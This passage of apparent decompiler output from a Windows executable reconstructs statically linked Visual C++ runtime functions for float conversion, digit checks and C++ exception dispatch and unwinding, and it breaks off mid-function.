// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2010 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



undefined4 * __thiscall FUN_00416a4f(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0041e634;
  FUN_004102b1((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a83e(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00416ace:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00416aad:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00416ace;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00416aad;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  int iVar1;
  _ptiddata p_Var2;
  
  iVar1 = **param_1;
  if ((iVar1 == -0x1fbcbcae) || (iVar1 == -0x1fbcb0b3)) {
    p_Var2 = __getptd();
    if (0 < p_Var2->_ProcessingThrow) {
      p_Var2 = __getptd();
      p_Var2->_ProcessingThrow = p_Var2->_ProcessingThrow + -1;
    }
  }
  else if (iVar1 == -0x1f928c9d) {
    p_Var2 = __getptd();
    p_Var2->_ProcessingThrow = 0;
    terminate();
    return p_Var2;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2010 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int iVar3;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar2 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar2 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar3 = iVar2, iVar3 != param_4) {
    if ((iVar3 < 0) || (*(int *)(param_3 + 4) <= iVar3)) {
      _inconsistency();
    }
    iVar2 = *(int *)(*(int *)(param_3 + 8) + iVar3 * 8);
    if (*(int *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8) != 0) {
      *(int *)(param_1 + 8) = iVar2;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8),param_1,0x103);
    }
  }
  FUN_00416be6();
  if (iVar3 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar3;
  return;
}



void FUN_00416be6(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2010 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2010 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_00416d3e(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  unexpected();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0041eda8;
  uStack_c = 0x416d93;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00416ead();
  return local_20;
}



void FUN_00416ead(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2010 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          FID_conflict__memcpy(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        FID_conflict__memcpy(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_00416fa8;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_00416fa8:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2010 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2010 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  _ptiddata p_Var1;
  void *pvVar2;
  int iVar3;
  _s_TryBlockMapEntry *p_Var4;
  int *piVar5;
  int iVar6;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint in_stack_fffffff0;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var1 = __getptd();
    if (p_Var1->_translator != (void *)0x0) {
      p_Var1 = __getptd();
      pvVar2 = (void *)FUN_0040c6ff();
      if ((((p_Var1->_translator != pvVar2) && (*(int *)param_1 != -0x1fbcb0b3)) &&
          (*(int *)param_1 != -0x1fbcbcae)) &&
         (iVar3 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar3 != 0)) {
        return;
      }
    }
    if (*(int *)(param_5 + 0xc) == 0) {
      _inconsistency();
    }
    p_Var4 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff0);
    if (local_8 < in_stack_fffffff0) {
      piVar5 = (int *)(p_Var4 + 0xc);
      do {
        if ((piVar5[-3] <= param_6) && (param_6 <= piVar5[-2])) {
          iVar6 = *piVar5 * 0x10 + piVar5[1];
          iVar3 = *(int *)(iVar6 + -0xc);
          if (((iVar3 == 0) || (*(char *)(iVar3 + 8) == '\0')) &&
             ((*(byte *)(iVar6 + -0x10) & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)in_stack_fffffff0);
          }
        }
        local_8 = local_8 + 1;
        piVar5 = piVar5 + 5;
      } while (local_8 < in_stack_fffffff0);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2010 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  int *piVar1;
  _s_FuncInfo *p_Var2;
  byte **ppbVar3;
  uchar uVar4;
  bool bVar5;
  _ptiddata p_Var6;
  int iVar7;
  _s_TryBlockMapEntry *p_Var8;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var9;
  _s_FuncInfo *p_Var10;
  _s_FuncInfo **pp_Var11;
  int unaff_ESI;
  int *piVar12;
  _s_ESTypeList *unaff_EDI;
  byte **ppbVar13;
  uint *puVar14;
  EHRegistrationNode *pEVar15;
  undefined **in_stack_ffffffc8;
  uint local_24;
  byte **local_20;
  byte *local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  byte *local_10;
  int local_c;
  char local_5;
  
  p_Var10 = param_5;
  local_5 = '\0';
  if (*(int *)(param_5 + 4) < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (*(int *)(param_5 + 4) <= local_c)) {
    _inconsistency();
  }
  piVar12 = (int *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_004175da;
  p_Var9 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_0041742a;
  iVar7 = *(int *)(param_1 + 0x14);
  if (((iVar7 != 0x19930520) && (iVar7 != 0x19930521)) && (iVar7 != 0x19930522)) goto LAB_0041742a;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_0041742a;
  p_Var6 = __getptd();
  if (p_Var6->_curexception != (void *)0x0) {
    p_Var6 = __getptd();
    piVar12 = (int *)p_Var6->_curexception;
    param_1 = (EHExceptionRecord *)piVar12;
    p_Var6 = __getptd();
    param_3 = (_CONTEXT *)p_Var6->_curcontext;
    iVar7 = _ValidateRead(piVar12,1);
    if (iVar7 == 0) {
      _inconsistency();
    }
    if ((((*piVar12 == -0x1f928c9d) && (piVar12[4] == 3)) &&
        ((iVar7 = piVar12[5], iVar7 == 0x19930520 ||
         ((iVar7 == 0x19930521 || (iVar7 == 0x19930522)))))) && (piVar12[7] == 0)) {
      _inconsistency();
    }
    p_Var6 = __getptd();
    if (p_Var6->_curexcspec == (void *)0x0) goto LAB_0041742a;
    p_Var6 = __getptd();
    piVar1 = (int *)p_Var6->_curexcspec;
    p_Var6 = __getptd();
    iVar7 = 0;
    p_Var6->_curexcspec = (void *)0x0;
    uVar4 = IsInExceptionSpec(param_1,unaff_EDI);
    piVar12 = (int *)param_1;
    if (uVar4 != '\0') goto LAB_0041742a;
    p_Var10 = (_s_FuncInfo *)0x0;
    if (0 < *piVar1) {
      do {
        bVar5 = type_info::operator==
                          (*(type_info **)(p_Var10 + piVar1[1] + 4),
                           (type_info *)&PTR_PTR__scalar_deleting_destructor__00421520);
        if (bVar5) goto LAB_004173ee;
        iVar7 = iVar7 + 1;
        p_Var10 = p_Var10 + 0x10;
      } while (iVar7 < *piVar1);
    }
    do {
      terminate();
LAB_004173ee:
      ___DestructExceptionObject((int *)param_1);
      param_1 = (EHExceptionRecord *)s_bad_exception_0041e63c;
      std::exception::exception((exception *)&stack0xffffffc8,(char **)&param_1);
      in_stack_ffffffc8 = &PTR_FUN_0041e634;
      __CxxThrowException_8(&stack0xffffffc8,&DAT_0041ee0c);
      p_Var9 = p_Var10;
      piVar12 = (int *)param_1;
LAB_0041742a:
      puVar14 = (uint *)param_5;
      p_Var10 = param_5;
      if (((*piVar12 == -0x1f928c9d) && (piVar12[4] == 3)) &&
         ((p_Var2 = (_s_FuncInfo *)piVar12[5], p_Var2 == p_Var9 ||
          ((p_Var2 == (_s_FuncInfo *)0x19930521 || (p_Var2 == (_s_FuncInfo *)0x19930522)))))) {
        if ((*(int *)(param_5 + 0xc) != 0) &&
           (p_Var8 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_24),
           local_14 < local_24)) {
          ppbVar13 = (byte **)(p_Var8 + 0x10);
          do {
            local_20 = ppbVar13;
            if (((int)ppbVar13[-4] <= local_c) && (local_c <= (int)ppbVar13[-3])) {
              local_10 = *ppbVar13;
              ppbVar3 = ppbVar13;
              for (local_1c = ppbVar13[-1]; local_20 = ppbVar13, 0 < (int)local_1c;
                  local_1c = local_1c + -1) {
                pp_Var11 = *(_s_FuncInfo ***)(piVar12[7] + 0xc);
                local_20 = ppbVar3;
                for (local_18 = *pp_Var11; 0 < (int)local_18; local_18 = local_18 + -1) {
                  pp_Var11 = pp_Var11 + 1;
                  p_Var10 = *pp_Var11;
                  iVar7 = ___TypeMatch(local_10,(byte *)p_Var10,(uint *)piVar12[7]);
                  if (iVar7 != 0) {
                    local_5 = '\x01';
                    CatchIt((EHExceptionRecord *)piVar12,(EHRegistrationNode *)param_3,
                            (_CONTEXT *)param_4,param_5,p_Var10,(_s_HandlerType *)param_7,
                            (_s_CatchableType *)param_8,(_s_TryBlockMapEntry *)unaff_EDI,unaff_ESI,
                            unaff_EBX,(uchar)SUB41(in_stack_ffffffc8,0));
                    piVar12 = (int *)param_1;
                    goto LAB_00417526;
                  }
                }
                local_10 = local_10 + 0x10;
                ppbVar3 = local_20;
              }
            }
LAB_00417526:
            local_14 = local_14 + 1;
            ppbVar13 = local_20 + 5;
            puVar14 = (uint *)param_5;
            local_20 = ppbVar13;
          } while (local_14 < local_24);
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject(piVar12);
        }
        if ((((local_5 != '\0') || ((*puVar14 & 0x1fffffff) < 0x19930521)) || (puVar14[7] == 0)) ||
           (uVar4 = IsInExceptionSpec((EHExceptionRecord *)piVar12,unaff_EDI), uVar4 != '\0'))
        goto LAB_00417606;
        __getptd();
        __getptd();
        p_Var6 = __getptd();
        p_Var6->_curexception = piVar12;
        p_Var6 = __getptd();
        p_Var6->_curcontext = param_3;
        pEVar15 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar15 = param_2;
        }
        _UnwindNestedFrames(pEVar15,(EHExceptionRecord *)piVar12);
        piVar12 = (int *)param_5;
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_00416d3e(*(void **)((int)piVar12 + 0x1c));
        p_Var10 = param_5;
      }
LAB_004175da:
      if (*(int *)(p_Var10 + 0xc) == 0) goto LAB_00417606;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)piVar12,param_2,param_3,param_4,p_Var10,local_c,param_7,param_8)
    ;
LAB_00417606:
    p_Var6 = __getptd();
    if (p_Var6->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_0041761e(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_0041e634;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,uint *param_5,
          int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((*param_5 & 0x1fffffff) < 0x19930522 || ((*(byte *)(param_5 + 8) & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5[3] != 0) || ((0x19930520 < (*param_5 & 0x1fffffff) && (param_5[7] != 0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,(_s_FuncInfo *)param_5,
                    param_8,param_6,param_7);
      }
    }
    else if ((param_5[1] != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Library: Visual Studio 2010 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2010 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_00422244 == 0) {
    return *(ushort *)(PTR_DAT_00420d00 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_00418788((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00417854:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00417894;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00417886:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00417894;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00417886;
    goto LAB_00417854;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00417894:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_00418788((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_004178fc:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041793c;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041792e:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041793c;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041792e;
    goto LAB_004178fc;
  }
  if (local_1c != '\0') {
